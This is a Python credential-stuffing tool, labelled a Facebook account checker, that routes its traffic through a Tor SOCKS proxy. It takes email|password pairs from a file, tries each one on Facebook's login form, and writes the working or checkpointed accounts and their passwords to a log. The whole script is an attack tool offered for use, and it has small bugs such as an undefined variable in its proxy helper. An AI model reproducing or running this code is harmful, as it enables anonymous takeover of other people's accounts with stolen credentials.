#!/usr/bin/python

import mechanize,sys,re,socks,socket

#TOR Configuration
proxy = "127.0.0.1" 
port  = 9050

def create_proxy(proxy, timeout=None, source_address=None):
	sock = socks.socksocket()
	sock.connect(address)
	return sock

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy, port)

socket.socket = socks.socksocket
socket.create_proxy = create_proxy

def check_ip():
	r = mechanize.Browser()
	r.set_handle_robots(False)
	x = r.open("http://ifconfig.me/ip")
	return x.read()

def banner():
	print('''
...............
.  Facebook   .   Code by FilthyRoot
. Acc Chekcer . Jogjakarta Hacker Link
...............
''')
def write_log(file, content):
	f = open(file, "a")
	f.write(content)
	f.close()

def login(email,password):
	log = sys.argv[2]
	r = mechanize.Browser()
	r.set_handle_robots(False)
	r.set_proxies({"http":proxy})
	r.addheaders = [('User-agent','Firefox')]
	r.open("https://www.facebook.com/login.php")
	r.select_form(nr=0)
	r.form['email'] = email
	r.form['pass']  = password
	log = r.submit()
	return log.geturl()

if len(sys.argv) < 2:
	banner()
	print("Usage : python3 fb.py [empass.txt] [output.txt]")
else:
	check_ip()
	banner()
	empass = sys.argv[1]
	f = open(empass, "r")
	x = f.read().split("\n")
	for i in x:
		#print("IP : " + check_ip().decode('utf-8'))
		z = i.split("|")
		try:
			content = login(z[0],z[1])
			if re.search("/login/device-based/regular/login/",content):
				print("[x] Invalid " + z[0])
			elif re.search("recover",content) or re.search("checkpoint", content):
				print("[*] Checkpoint " + z[0])
				write_log(sys.argv[2], z[0] + "|" + z[1] + "|" + content + "\n")
			else:
				print("[+] Live " + z[0])
				write_log(sys.argv[2], z[0] + "|" + z[1] + "|" + content + "\n")
		except:
			pass